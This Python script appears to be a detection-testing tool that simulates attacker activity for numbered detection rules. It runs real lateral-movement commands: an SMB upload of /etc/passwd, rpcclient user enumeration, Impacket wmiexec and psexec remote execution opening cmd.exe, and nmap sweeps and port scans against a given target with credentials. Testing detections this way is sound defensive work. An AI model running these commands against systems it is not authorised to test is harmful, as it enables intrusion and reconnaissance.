#!/usr/bin/env python3

import argparse
import subprocess
import base64
import requests
import sys
from impacket.examples import logger
from impacket.examples.smbexec import RemoteShell
from impacket.smbconnection import SMBConnection

# Enable Impacket logging
logger.init()

rule_descriptions = {
    5: "Possible Lateral Tool Transfer via SMB",
    6: "Remote System Discovery Via RPC",
    7: "Execution Via WMI (Impacket)",
    16: "Spoolss Named Pipe Access via SMB",
    17: "Possible PsExec Execution (Impacket)",
    25: "Suspicious User Agent",
    26: "Suspicious Base64 Encoded User-Agent",
    30: "Potential Network Sweep Detected",
    31: "Potential Port Scan Detected",
}

description_text = "CPSDR Simulation Script (Kali - Attacker)\n\nSupported Rules:\n"
for number, desc in rule_descriptions.items():
    description_text += f"  {number}: {desc}\n"

parser = argparse.ArgumentParser(
    description=description_text,
    formatter_class=argparse.RawTextHelpFormatter
)
parser.add_argument("-o", "--option", required=True, type=int, help="Rule number to simulate (e.g., 5, 17, 30)")
parser.add_argument("-t", "--target", help="Target IP or hostname")
parser.add_argument("-u", "--username", help="Username for authentication (if required)")
parser.add_argument("-p", "--password", help="Password for authentication (if required)")

args = parser.parse_args()

def auth_required(rule_id):
    return rule_id in [5, 6, 7, 16, 17]

def get_cred_str():
    return f"{args.username}%{args.password}"

# Simulations
def simulate_5(target):  # SMB File Transfer
    print(f"[+] Simulating SMB File Transfer to {target}...")
    subprocess.run(["smbclient", f"//{target}/share", "-U", get_cred_str(), "-c", "put /etc/passwd"])

def simulate_6(target):  # RPC Discovery
    print(f"[+] Simulating RPC Discovery on {target}...")
    subprocess.run(["rpcclient", "-U", get_cred_str(), target, "-c", "enumdomusers"])

def simulate_7(target):  # WMI Exec (Impacket)
    print(f"[+] Simulating WMI Execution on {target} using Impacket...")
    try:
        subprocess.run(["wmiexec.py", f"{args.username}:{args.password}@{target}", "ipconfig"], check=False)
    except Exception as e:
        print(f"[!] WMI execution failed: {e}")

def simulate_16(target):  # Spoolss Named Pipe
    print(f"[+] Simulating Spoolss Named Pipe Access on {target}...")
    subprocess.run(["rpcclient", "-U", get_cred_str(), target, "-c", "netshareenumall"])

def simulate_17(target):  # PsExec (Impacket)
    print(f"[+] Simulating PsExec Execution on {target} using Impacket...")
    try:
        subprocess.run(["psexec.py", f"{args.username}:{args.password}@{target}", "cmd.exe"], check=False)
    except Exception as e:
        print(f"[!] PsExec execution failed: {e}")

def simulate_25(target):  # Suspicious User-Agent
    print(f"[+] Sending Suspicious User-Agent to {target}...")
    headers = {"User-Agent": "python-requests/evil-miner"}
    try:
        requests.get(f"http://{target}", headers=headers, timeout=5)
    except Exception as e:
        print(f"[!] HTTP request failed: {e}")

def simulate_26(target):  # Base64 User-Agent
    print(f"[+] Sending Base64 User-Agent to {target}...")
    b64_agent = base64.b64encode(b"malicious-agent").decode()
    headers = {"User-Agent": b64_agent}
    try:
        requests.get(f"http://{target}", headers=headers, timeout=5)
    except Exception as e:
        print(f"[!] HTTP request failed: {e}")

def simulate_30(target):  # Nmap Sweep
    print(f"[+] Running Nmap Sweep on {target}...")
    subprocess.run(["nmap", "-sn", target])

def simulate_31(target):  # Full Port Scan
    print(f"[+] Running Full Port Scan on {target}...")
    subprocess.run(["nmap", "-p-", target])

rule_map = {
    5: simulate_5,
    6: simulate_6,
    7: simulate_7,
    16: simulate_16,
    17: simulate_17,
    25: simulate_25,
    26: simulate_26,
    30: simulate_30,
    31: simulate_31
}

# Validation
if args.option not in rule_map:
    print(f"[!] Rule ID {args.option} is not supported in this script.")
    sys.exit(1)

if args.option in [5, 6, 7, 16, 17, 25, 26, 30, 31] and not args.target:
    print("[!] This simulation requires a -t <target>")
    sys.exit(1)

if auth_required(args.option) and (not args.username or not args.password):
    print("[!] This simulation requires -u <username> and -p <password>")
    sys.exit(1)

# Run
if args.target:
    rule_map[args.option](args.target)
else:
    rule_map[args.option]("")
